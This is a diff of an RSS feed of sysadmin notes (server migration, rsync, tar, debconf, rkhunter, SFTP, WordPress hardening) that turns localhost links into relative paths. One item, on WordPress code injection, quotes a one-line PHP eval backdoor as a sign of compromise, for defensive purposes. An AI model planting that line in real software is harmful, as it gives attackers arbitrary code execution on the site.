@@ -2,22 +2,22 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>System Administration on TLDR Dev Notes</title>
-    <link>localhost/hugo-tldr/sysadmin/</link>
+    <link>/sysadmin/</link>
     <description>Recent content in System Administration on TLDR Dev Notes</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>TOML &amp;copy; 2017. All rights reserved.</copyright>
     <lastBuildDate>Fri, 27 Apr 2018 00:00:00 +0000</lastBuildDate>
     
-	<atom:link href="localhost/hugo-tldr/sysadmin/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="/sysadmin/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Tranfer between Debian Apache based setups</title>
-      <link>localhost/hugo-tldr/sysadmin/debian_server_transfer/</link>
+      <link>/sysadmin/debian_server_transfer/</link>
       <pubDate>Fri, 27 Apr 2018 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/debian_server_transfer/</guid>
+      <guid>/sysadmin/debian_server_transfer/</guid>
       <description>Transfer server from DigitalOcean to Vultr Transfering between Debian Apache based setups
 This is my current setup
  Apache, MySQL, PHP, phpMyAdmin on Ubuntu Domains added via vhost conf files Let&amp;rsquo;s Encrypt SSL certificates   Transfer databases Transfer all vhost.conf files in /var/etc/site_enabled Transfer all sites in /var/www Transfer SSL certs for all domains  Transfer Domain Conf files This involves
@@ -26,20 +26,20 @@ This is my current setup
     
     <item>
       <title>Install sedutil on Ubuntu</title>
-      <link>localhost/hugo-tldr/sysadmin/install_sedutil/</link>
+      <link>/sysadmin/install_sedutil/</link>
       <pubDate>Mon, 08 Jan 2018 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/install_sedutil/</guid>
+      <guid>/sysadmin/install_sedutil/</guid>
       <description># download sedutil # make sure requisite libs are installed sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y sudo apt install -y build-essential g++ # install make tools sudo apt install autoconf -y # build sedutil (run from project root) autoreconf -i ./configure make  Enable TPM libata.allow_tpm=1 by editing the GRUB config
 sudo nano etc/default/grub  GRUB_CMDLINE_LINUX_DEFAULT=&amp;quot;quiet splash libata.allow_tpm=1&amp;quot;  sudo update-grub reboot  Add sedutil-cli to $PATH so that it can be executed from anywhere in the shell</description>
     </item>
     
     <item>
       <title>Configuring networking interfaces</title>
-      <link>localhost/hugo-tldr/sysadmin/configure-networking/</link>
+      <link>/sysadmin/configure-networking/</link>
       <pubDate>Sun, 07 Jan 2018 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/configure-networking/</guid>
+      <guid>/sysadmin/configure-networking/</guid>
       <description>Finding network interface # See a list of networks available ls /sys/class/net # See if your network is disabled sudo lshw -C network ip addr  Turn down a network
 sudo ip ls dev en0 down sudo ifdown en0  # Enable interfaces sudo ifup -v eth0  The file to edit to configure networks
 sudo nano /etc/network/interfaces  Try booting in recovery and then enabling networking. This was the easiest way for me to get ethernet to work.</description>
@@ -47,19 +47,19 @@ sudo nano /etc/network/interfaces  Try booting in recovery and then enabling net
     
     <item>
       <title>Show/Hide hidden files in Finder</title>
-      <link>localhost/hugo-tldr/sysadmin/macos-hidden-files-show-hide-finder/</link>
+      <link>/sysadmin/macos-hidden-files-show-hide-finder/</link>
       <pubDate>Sun, 12 Nov 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/macos-hidden-files-show-hide-finder/</guid>
+      <guid>/sysadmin/macos-hidden-files-show-hide-finder/</guid>
       <description>tl;dr defaults write com.apple.finder AppleShowAllFiles NO # don&#39;t show hidden files defaults write com.apple.finder AppleShowAllFiles YES # show hidden files killall Finder /System/Library/CoreServices/Finder.app # restart Finder # aliases (showFiles &amp;amp; hideFiles) echo &amp;quot;alias showFiles=&#39;defaults write com.apple.finder AppleShowAllFiles YES &amp;amp;&amp;amp; killall Finder /System/Library/CoreServices/Finder.app&#39;&amp;quot; &amp;gt;&amp;gt; ~/.aliases echo &amp;quot;alias hideFiles=&#39;defaults write com.apple.finder AppleShowAllFiles NO &amp;amp;&amp;amp; killall Finder /System/Library/CoreServices/Finder.app&#39;&amp;quot; &amp;gt;&amp;gt; ~/.aliases  Aliases go into where you save them. This could be ~/.bash_profile if you have no idea what aliases are, ~/.</description>
     </item>
     
     <item>
       <title>Get all kinds of information about your Mac machine using the Terminal</title>
-      <link>localhost/hugo-tldr/sysadmin/macos_system_profile_report_details/</link>
+      <link>/sysadmin/macos_system_profile_report_details/</link>
       <pubDate>Sat, 11 Nov 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/macos_system_profile_report_details/</guid>
+      <guid>/sysadmin/macos_system_profile_report_details/</guid>
       <description># generate a System Report.. system_profiler  This command is the command line equivalent of going to About This Mac &amp;gt; System Report..
 You might need this if you write Bash scripts for example where you want to know if a program is installed on the system or not.
 If you just run the command in the Terminal, it will start outputting all kinds of information, LOADS of it, including stuff like your machine&amp;rsquo;s UUID, available Wi-Fi networks, system diagnostic tests, details about what Applications are installed on the system and their versions, the fonts installed, hardware overview and so on.</description>
@@ -67,19 +67,19 @@ If you just run the command in the Terminal, it will start outputting all kinds 
     
     <item>
       <title>Resetting an &#39;Unavailable&#39; Serial Number on a Mac</title>
-      <link>localhost/hugo-tldr/sysadmin/macos-serial-number-unavailable/</link>
+      <link>/sysadmin/macos-serial-number-unavailable/</link>
       <pubDate>Sat, 11 Nov 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/macos-serial-number-unavailable/</guid>
+      <guid>/sysadmin/macos-serial-number-unavailable/</guid>
       <description>tl;dr  Note down your serial number (printed on underside of laptop, or purchase receipt) Download and write Blank Board Serializer .dmg to a USB Boot from USB by pressing the C key Follow instructions and enter your serial number  Not having a serial number is usually due to a hardware change. Something was repaired, added (e.g. extra RAM) or replaced. The next common reason is software upgrade. Upgrading to OS X El Capitan has been reported to make the serial number go missing (the case with my 2013 Macbook Air, never repaired and bought directly from Apple in Dubai).</description>
     </item>
     
     <item>
       <title>Dive into Linux (workshop notes)</title>
-      <link>localhost/hugo-tldr/sysadmin/dive-into-linux/</link>
+      <link>/sysadmin/dive-into-linux/</link>
       <pubDate>Sat, 23 Sep 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/dive-into-linux/</guid>
+      <guid>/sysadmin/dive-into-linux/</guid>
       <description>Hardware &amp;gt; Kernel (Ubuntu/Android) &amp;gt; OS Linux is a Kernel, Android uses that Kernel but the OS on top is different
 Desktop Environmentss (basically a theme on top of the OS)
  GNOME KDE  Package Management
@@ -89,48 +89,48 @@ Desktop Environmentss (basically a theme on top of the OS)
     
     <item>
       <title>Use rsync to mirror websites</title>
-      <link>localhost/hugo-tldr/sysadmin/rsync-mirror-website-server/</link>
+      <link>/sysadmin/rsync-mirror-website-server/</link>
       <pubDate>Wed, 06 Sep 2017 09:22:43 +0500</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/rsync-mirror-website-server/</guid>
+      <guid>/sysadmin/rsync-mirror-website-server/</guid>
       <description>tl;dr apt update &amp;amp;&amp;amp; apt install rsync #Access via remote shell: # Pull: rsync [OPTION...] [USER@]HOST:SRC... [DEST] # Push: rsync [OPTION...] SRC... [USER@]HOST:DEST # Pull: sync remote with local rsync -vhaze ssh user@server.example.com:/var/www/ /var/www rsync -vhaze &amp;quot;ssh -p 1234 -i /root/.ssh/id_rsa&amp;quot; root@server.example.com:/var/www/cakebox.me/public_html/ /var/www/cakebox.me/public_html rsync -qaze &amp;quot;ssh -p 1234 -i /root/.ssh/id_rsa&amp;quot; root@server.example.com:/etc/letsencrypt/archive :/etc/letsencrypt/live :/etc/letsencrypt/renewal /etc/letsencrypt/  -v, --verbose increase verbosity -h, --human-readable output numbers in a human-readable format -q, --quiet suppress non-error messages -a, --archive archive mode; equals -rlptgoD (no -H,-A,-X) -z, --compress compress file data during the transfer -e, --rsh=COMMAND specify the remote shell to use   explainshell for the rsync command.</description>
     </item>
     
     <item>
       <title>Backups with tar</title>
-      <link>localhost/hugo-tldr/sysadmin/backups-tar-linux/</link>
+      <link>/sysadmin/backups-tar-linux/</link>
       <pubDate>Thu, 17 Aug 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/backups-tar-linux/</guid>
+      <guid>/sysadmin/backups-tar-linux/</guid>
       <description>tar tar is an archiving utility, it creates and extracts (compressed) archives (aka tarballs).
 tar -czpf foo.tar.gz sourceFiles file1 file2 # creates compressed archive tar -xpf foo.tar.gz # extracts archive tar -xpf foo.tar.gz -C dest/ # extracts archive in the `dest/` directory   c or --createcreates x or --extract extracts z or --gzip/--gunzip zip, compresses or uncompresses the archive with gzip p or --preserve-permissions preserves file and directory permissions f provide the File name (foo.</description>
     </item>
     
     <item>
       <title>Checking log files</title>
-      <link>localhost/hugo-tldr/sysadmin/check-log-files/</link>
+      <link>/sysadmin/check-log-files/</link>
       <pubDate>Thu, 17 Aug 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/check-log-files/</guid>
+      <guid>/sysadmin/check-log-files/</guid>
       <description>Logs directory The common directory for logs is /var/log. Programs tend to save their logs in their own subdirectories under /var/log/. For example:
  Apache: /var/log/apache2 MySQL: /var/log/mysql  Monitoring logs Get n number of lines from the end of the file with tail -n To check log files, tail is better than cat. cat will dump the whole log file to the console, good luck scrolling. tail -20 will print only the last 20 lines of the file.</description>
     </item>
     
     <item>
       <title>Intro to debconf</title>
-      <link>localhost/hugo-tldr/sysadmin/debconf-intro/</link>
+      <link>/sysadmin/debconf-intro/</link>
       <pubDate>Sat, 12 Aug 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/debconf-intro/</guid>
+      <guid>/sysadmin/debconf-intro/</guid>
       <description>tl;dr  debcnof is a configuration management tool all the questions you get during installing .deb packages are stored in debconf You can preload answers to those questions to get non-interactive/slient installations needs sudo  sudo apt install debconf-utils # get configurable values for a package sudo debconf-get-selections | grep mysql # set values echo &amp;quot;set mysql-server/root_password YOURPASSWORD&amp;quot; | debconf-communicate # sudo debconf-set-selections &amp;lt;&amp;lt;&amp;lt; &amp;quot;mysql-server mysql-server/root_password password YOURPASSWORD&amp;quot; # echo &#39;mysql-server mysql-server/root_password password YOURPASSWORD&#39; | debconf-set-selections # show the list of debconf values configured for a package debconf-show phpmyadmin  debconf is a configuration management tool for Debain.</description>
     </item>
     
     <item>
       <title>Taking care of prompt imputs from a script with Debconf</title>
-      <link>localhost/hugo-tldr/sysadmin/debconf-set-selections-prompt-installs/</link>
+      <link>/sysadmin/debconf-set-selections-prompt-installs/</link>
       <pubDate>Sat, 12 Aug 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/debconf-set-selections-prompt-installs/</guid>
+      <guid>/sysadmin/debconf-set-selections-prompt-installs/</guid>
       <description> sudo apt install debconf-utils -y  see what possible selections a package may have
 sudo debconf-get-selections | grep mysql  mysql-server-5.7	mysql-server/root_password	password mysql-server-5.7	mysql-server/root_password_again	password mysql-server-5.7	mysql-server/no_upgrade_when_using_ndb	error mysql-server-5.7	mysql-server/password_mismatch	error mysql-server-5.7	mysql-server-5.7/start_on_boot	boolean	true mysql-server-5.7	mysql-server-5.7/postrm_remove_databases	boolean	false mysql-server-5.7	mysql-server-5.7/nis_warning	note mysql-server-5.7	mysql-server-5.7/really_downgrade	boolean	false  set those selections
 MYSQL_PASS=&#39;your_password&#39; sudo debconf-set-selections &amp;lt;&amp;lt;&amp;lt; &amp;quot;mysql-server mysql-server/root_password password ${MYSQL_PASS}&amp;quot; sudo debconf-set-selections &amp;lt;&amp;lt;&amp;lt; &amp;quot;mysql-server mysql-server/root_password_again password ${MYSQL_PASS}&amp;quot;  Links  Installing MySQL (with Debconf) Pre-loading debconf values for easy installation  </description>
@@ -138,40 +138,40 @@ MYSQL_PASS=&#39;your_password&#39; sudo debconf-set-selections &amp;lt;&amp;lt;&
     
     <item>
       <title>Image Optimization on Linux Servers using jpegoptim and optipng</title>
-      <link>localhost/hugo-tldr/sysadmin/image-optimization-linux-ubuntu-jpegoptim-optipng/</link>
+      <link>/sysadmin/image-optimization-linux-ubuntu-jpegoptim-optipng/</link>
       <pubDate>Fri, 11 Aug 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/image-optimization-linux-ubuntu-jpegoptim-optipng/</guid>
+      <guid>/sysadmin/image-optimization-linux-ubuntu-jpegoptim-optipng/</guid>
       <description>The idea is to have a script that runs periodically and compresses image files in specified directories
  Optimize images in known directories, e.g. wp-content/uploads for WordPress, image/catalog/ in OpenCart etc. Only optimize newly added files, instead of redoing the whole folder every time (on every cron run) Setup a cron so it does it on it&amp;rsquo;s own, periodically (e.g. every day)  You being the developer might be conscious of optimizing images before you upload them, but the clients usually aren&amp;rsquo;t.</description>
     </item>
     
     <item>
       <title>Intro to Rootkit Hunter</title>
-      <link>localhost/hugo-tldr/sysadmin/intro-to-rootkit-hunter/</link>
+      <link>/sysadmin/intro-to-rootkit-hunter/</link>
       <pubDate>Fri, 11 Aug 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/intro-to-rootkit-hunter/</guid>
+      <guid>/sysadmin/intro-to-rootkit-hunter/</guid>
       <description>RKHunter downloads a list of known exploits and then checks your system against the database. It also alerts you if it detects unsafe settings in some common applications.
 #!/bin/bash apt update &amp;amp;&amp;amp; apt upgrade -y # Rootkit Hunter - Scan for Rootkits, backdoors and exploits EMAIL=&#39;&#39; # email for sending logs SERVER=&#39;&#39; # server name rkhunter() { wget https://downloads.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz tar xf rkhunter-1.4.4.tar.gz sudo rkhunter-1.4.4/installer.sh --install # by default it installs in /usr/local/bin (which is in $PATH) # confirm install by checking version sudo rkhunter --versioncheck # Pre-run Updates sudo rkhunter --update # update database sudo rkhunter --propupd # Before running RKH, fill the file properties database (set baseline file properties so that rkhunter can alert us if any of the essential configuration files it tracks are altered) # Scan sudo rkhunter --check # scan the entire file system # Cron touch /etc/cron.</description>
     </item>
     
     <item>
       <title>Secure a Linux Ubuntu Server</title>
-      <link>localhost/hugo-tldr/sysadmin/secure-linux-ubuntu-server/</link>
+      <link>/sysadmin/secure-linux-ubuntu-server/</link>
       <pubDate>Fri, 11 Aug 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/secure-linux-ubuntu-server/</guid>
+      <guid>/sysadmin/secure-linux-ubuntu-server/</guid>
       <description>STATUS: Draft
 #!/bin/bash # SECURE / HARDEN A LINUX (UBUNTU) SERVER apt update &amp;amp;&amp;amp; apt upgrade -y # Enable automatically installing security updates # Rootkit Hunter - Scan for Rootkits, backdoors and exploits rkhunter() { wget https://downloads.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz tar xf rkhunter-1.4.4.tar.gz sudo rkhunter-1.4.4/installer.sh --layout default --install sudo rkhunter --versioncheck sudo rkhunter --update # update database sudo rkhunter --propupd # set baseline file properties (so that rkhunter can alert us if any of the essential configuration files it tracks are altered) rkhunter --check # scan the entire file system }  RKHunter downloads a list of known exploits and then checks your system against the database.</description>
     </item>
     
     <item>
       <title>Intro to Homebrew</title>
-      <link>localhost/hugo-tldr/sysadmin/homebrew-intro/</link>
+      <link>/sysadmin/homebrew-intro/</link>
       <pubDate>Wed, 09 Aug 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/homebrew-intro/</guid>
+      <guid>/sysadmin/homebrew-intro/</guid>
       <description>Intro Home brew is a package manager for macOS, just like apt is for Debian systems and yum is for CentOS systems. The main reason people love Homebrew is because it helps in bringing some Linux utilities to macOS, wget and tree for example. It also makes managing installed packages easier.
 Where you&amp;rsquo;d normally do apt install wget, Homebrew let&amp;rsquo;s you do brew install wget.
 Cellar The Cellar is a place that all your kegs go.</description>
@@ -179,39 +179,39 @@ Cellar The Cellar is a place that all your kegs go.</description>
     
     <item>
       <title>SFTP Users for Website directory</title>
-      <link>localhost/hugo-tldr/sysadmin/sftp-www/</link>
+      <link>/sysadmin/sftp-www/</link>
       <pubDate>Wed, 09 Aug 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/sftp-www/</guid>
+      <guid>/sysadmin/sftp-www/</guid>
       <description>tl;dr
  The ChrootDirectory must be owned by root. You can enable access to dirs inside the ChrootDirectory owned by different users The ChrootDirectory needs 755 permissions Add everything to the END OF THE FILE. Or else it won&amp;rsquo;t work Web directories /var/www need to be owned by www-data  What we&amp;rsquo;ll do  Create a Group for SFTP access Add our users to that SFTP Group  Here&amp;rsquo;s what each of those directives do:</description>
     </item>
     
     <item>
       <title>Install a LAMP stack</title>
-      <link>localhost/hugo-tldr/sysadmin/install-lamp-debian-ubuntu/</link>
+      <link>/sysadmin/install-lamp-debian-ubuntu/</link>
       <pubDate>Tue, 25 Jul 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/install-lamp-debian-ubuntu/</guid>
+      <guid>/sysadmin/install-lamp-debian-ubuntu/</guid>
       <description>This is for a debian/ubuntu environment We&amp;rsquo;re going to install PHP at the end since it&amp;rsquo;s the longest step and has more explanations  Setup details  PHP version 7 or greater MySQL version 5.6 or greater HTTPS support  Getting ready sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y  Apache sudo apt install apache2 apache2-utils ssl-cert -y  MySQL sudo apt install mysql-server mysql-client -y  Secure the installation</description>
     </item>
     
     <item>
       <title>Install PHP5 on Ubuntu 17.04 Zesty Zapus</title>
-      <link>localhost/hugo-tldr/sysadmin/install-php5-php7-ubuntu-zesty/</link>
+      <link>/sysadmin/install-php5-php7-ubuntu-zesty/</link>
       <pubDate>Thu, 06 Jul 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/install-php5-php7-ubuntu-zesty/</guid>
+      <guid>/sysadmin/install-php5-php7-ubuntu-zesty/</guid>
       <description>(Theoretically) You can install both PHP5 and PHP7 and switch between them.. If you only want PHP5, add the repo, install the packages for PHP 5.6 and end it there.
 WARNING:   This leads to PhpMyAdmin not working if you install it afterwards.. Both versions working has not been tested in production. If you check PHP version on system, php --version, it still shows PHP 7.0   add repo There are no PHP 5.</description>
     </item>
     
     <item>
       <title>Code Injection Attacks in WordPress</title>
-      <link>localhost/hugo-tldr/sysadmin/code-injection-attacks/</link>
+      <link>/sysadmin/code-injection-attacks/</link>
       <pubDate>Wed, 05 Jul 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/code-injection-attacks/</guid>
+      <guid>/sysadmin/code-injection-attacks/</guid>
       <description>tl;dr: If you find this line of code in any files of your WordPress install, get worried, get rid of it immediately.
 &amp;lt;?php @eval($_POST[&#39;@01&#39;]);?&amp;gt;   With this line of code, the hacker will be able to execute any code he wants. Therefore this code will have the power to read, update or delete any data he wants.
 We don&amp;rsquo;t know yet what code he will choose to execute because the code will be passed as a $_POST argument.</description>
@@ -219,29 +219,29 @@ We don&amp;rsquo;t know yet what code he will choose to execute because the code
     
     <item>
       <title>Finding a system breach</title>
-      <link>localhost/hugo-tldr/sysadmin/find-system-breach/</link>
+      <link>/sysadmin/find-system-breach/</link>
       <pubDate>Wed, 05 Jul 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/find-system-breach/</guid>
+      <guid>/sysadmin/find-system-breach/</guid>
       <description> Check the logs  /home/user/logs/ /var/log/apache2/access.log /var/log/apache2/error.log  Check .bash_history for any recently run commands  </description>
     </item>
     
     <item>
       <title>Finding infected files in WordPress</title>
-      <link>localhost/hugo-tldr/sysadmin/finding-infected-files-wordpress/</link>
+      <link>/sysadmin/finding-infected-files-wordpress/</link>
       <pubDate>Wed, 05 Jul 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/finding-infected-files-wordpress/</guid>
+      <guid>/sysadmin/finding-infected-files-wordpress/</guid>
       <description>The best thing to do is to clean your database, delete your site and re-install it.
  Keep things updated Don&amp;rsquo;t install themes from warez sites, duh. If you don&amp;rsquo;t pay for it, you&amp;rsquo;ll end up paying for it, only worse.. Disable any files that you find suspicious. This can be done simply by add a .OFF at the end of the file name, after the extension. For example favicon_de19d8.</description>
     </item>
     
     <item>
       <title>Securing Wordpress</title>
-      <link>localhost/hugo-tldr/sysadmin/securing-wordpress/</link>
+      <link>/sysadmin/securing-wordpress/</link>
       <pubDate>Wed, 05 Jul 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/securing-wordpress/</guid>
+      <guid>/sysadmin/securing-wordpress/</guid>
       <description>File Permissions The default permission scheme should be:
  Folders 755 Files 644  Avoid having any file or directory set to 777. 777 means global access. Usually only cache files have this permission.
 Via command line you can run the following commands to change permissions recursively:
@@ -250,10 +250,10 @@ Via command line you can run the following commands to change permissions recurs
     
     <item>
       <title>cPanel Web Templates and Skeleton Directory</title>
-      <link>localhost/hugo-tldr/sysadmin/edit-cpanel-skel-webtemplates/</link>
+      <link>/sysadmin/edit-cpanel-skel-webtemplates/</link>
       <pubDate>Wed, 05 Jul 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/edit-cpanel-skel-webtemplates/</guid>
+      <guid>/sysadmin/edit-cpanel-skel-webtemplates/</guid>
       <description>Web Templates /var/cpanel/webtemplates/user/english/  Web templates are default template .tmpl files that are shown for status pages.
  Default Website Page (Has not yet been configured by the domain owner) Account Move (Has moved) Account Suspended (Has been suspended) Connection Selection (Is experiencing a connection or firewall problem)  The files to edit are:
 /var/cpanel/webtemplates/user/english/default.tmpl /var/cpanel/webtemplates/root/english/moving.tmpl /var/cpanel/webtemplates/root/english/redirect.tmpl /var/cpanel/webtemplates/user/english/suspended.tmpl  Web Templates can also be edited via WHM &amp;gt; Account Functions &amp;gt; Web Template Editor</description>
@@ -261,39 +261,39 @@ Via command line you can run the following commands to change permissions recurs
     
     <item>
       <title>Migrating server data and databases</title>
-      <link>localhost/hugo-tldr/sysadmin/migrating-server-data/</link>
+      <link>/sysadmin/migrating-server-data/</link>
       <pubDate>Thu, 02 Feb 2017 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/migrating-server-data/</guid>
+      <guid>/sysadmin/migrating-server-data/</guid>
       <description>Migrating data from a barebones server to another barebones server Compress files Let&amp;rsquo;s say you have websites in /var/www folder that you want to transfer. Compressing them first will save bandwidth as well as transfer time.
 # tar czf &amp;lt;filename&amp;gt; &amp;lt;source&amp;gt; tar czf aamnah.tar.gz /var/www/aamnah.com  c - create z - compress (gzip) f - take a filename v - verbose (optional, if you wanna see lines fly by on the termianl)</description>
     </item>
     
     <item>
       <title>Configure SFTP</title>
-      <link>localhost/hugo-tldr/sysadmin/sftp-install-configure/</link>
+      <link>/sysadmin/sftp-install-configure/</link>
       <pubDate>Tue, 08 Mar 2016 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/sftp-install-configure/</guid>
+      <guid>/sysadmin/sftp-install-configure/</guid>
       <description>The ChrootDirectory must be owned by root. You can enable access to dirs inside the ChrootDirectory owned by differet users The ChrootDirectory needs 755 permissions Add everything to the END OF THE FILE. Or else it won&amp;rsquo;t work Web directories /var/www need to be owned by www-data  Setup link Step 1 : Install OpenSSH package if not installed
 sudo apt-get install openssh-server  Step 2 : Create separate group for SFTP users.</description>
     </item>
     
     <item>
       <title>Install ionCube Loader on Ubuntu 16.04</title>
-      <link>localhost/hugo-tldr/sysadmin/install-ioncube-loader/</link>
+      <link>/sysadmin/install-ioncube-loader/</link>
       <pubDate>Sat, 13 Feb 2016 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/install-ioncube-loader/</guid>
+      <guid>/sysadmin/install-ioncube-loader/</guid>
       <description>wget https://downloads.ioncube.com/loader_downloads/ioncube_loaders_lin_x86-64.tar.gz # download tar xzvf ioncube_loaders_lin_x86-64.tar.gz # extract php -v # find out PHP version e.g. 7.2 php -i | grep extension_dir # find out PHP extensions directory # copy closest matching ioncube module to your PHP extensions directory sudo cp &amp;quot;ioncube/ioncube_loader_lin_7.0.so&amp;quot; /usr/lib/php/20160731/ # copy this line to top of php.ini /etc/php/7.2/apache2/php.ini # OR copy this to a new configuration file `00-ioncube.ini` and load it (by moving to /etc/php/7.</description>
     </item>
     
     <item>
       <title>Get Linux System Information</title>
-      <link>localhost/hugo-tldr/sysadmin/get-linux-system-info/</link>
+      <link>/sysadmin/get-linux-system-info/</link>
       <pubDate>Thu, 12 Nov 2015 00:00:00 +0000</pubDate>
       
-      <guid>localhost/hugo-tldr/sysadmin/get-linux-system-info/</guid>
+      <guid>/sysadmin/get-linux-system-info/</guid>
       <description>Routes  Use the uname command Use the /etc/*-release files Use a programming language (high-level approahc) python -mplatform Use environment variables like OSTYPE  Commands uname, hostname, machine, sw_vers are all commands you can use.
 uname has a few flags (a,p,m) you can use.
 cat /etc/issue : check CentOS/Ubuntu version cat /etc/os-release : get distro name 2 cat /etc/lsb-release : cat /etc/redhat-release : uname : with no arguments will name the operating system.</description>
